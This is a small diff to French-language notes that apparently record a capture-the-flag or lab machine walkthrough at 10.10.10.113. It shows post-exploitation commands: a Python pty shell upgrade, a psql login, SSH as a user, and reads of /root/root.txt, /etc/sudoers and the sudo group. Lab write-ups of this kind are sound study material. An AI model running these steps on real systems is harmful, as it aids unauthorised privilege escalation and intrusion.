@@ -79,7 +79,7 @@ ROOT ACCESS :
 
 	Connexion Postgresql :
 	
-		python3 -c 'import pty;pty.spawn("/bin/bash")'
+		python3 -c 'import pty;pty.spawn("/bin/bash")' (Ne pas faire sinon postgresql bug)
 		
 		psql -h 127.0.0.1 -d unix -U unixusrmgr
 		\dt
@@ -91,8 +91,8 @@ ROOT ACCESS :
 	ssh illumdir@10.10.10.113
 
 	id
-	cat /root/root.txt XXXX
-	cat /etc/shudoer
+	cat /root/root.txt XXXX => indice
+	cat /etc/sudoers
 	cat /etc/group | grep sudo >>>> 27
 
 9/ Retour POSTGRES
